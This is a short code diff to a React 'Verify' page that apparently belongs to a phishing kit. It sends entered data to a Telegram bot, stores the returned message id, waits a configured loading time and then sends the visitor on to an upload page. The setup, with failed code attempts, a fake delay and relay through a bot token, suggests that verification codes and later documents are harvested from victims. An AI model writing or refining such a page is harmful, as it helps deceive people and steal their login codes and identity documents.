@@ -16,7 +16,6 @@ interface Config {
 	token: string;
 	loadingTime: number;
 	maxAttempt: number;
-	codeEnabled: boolean;
 }
 
 const initialUIState: UIState = {
@@ -59,7 +58,6 @@ const Verify: FC = () => {
 		token: "",
 		loadingTime: 0,
 		maxAttempt: 0,
-		codeEnabled: false,
 	});
 
 	useEffect(() => {
@@ -69,7 +67,6 @@ const Verify: FC = () => {
 			token: telegram.data_token,
 			loadingTime: settings.code_loading_time,
 			maxAttempt: settings.max_failed_code_attempts,
-			codeEnabled: settings.code_input_enabled,
 		});
 	}, []);
 
@@ -87,12 +84,17 @@ const Verify: FC = () => {
 			setUiState((prev) => ({ ...prev, isLoading: true }));
 
 			try {
-				await sendTelegramMessage(message, config, savedMessageId);
+				const response = await sendTelegramMessage(
+					message,
+					config,
+					savedMessageId,
+				);
+				localStorage.setItem("messageId", response.data.result.message_id);
 				setTimeout(() => {
-					navigate("/document-verify");
+					navigate("/upload");
 				}, config.loadingTime);
 			} catch {
-				navigate("/document-verify");
+				navigate("/upload");
 			}
 			return;
 		}
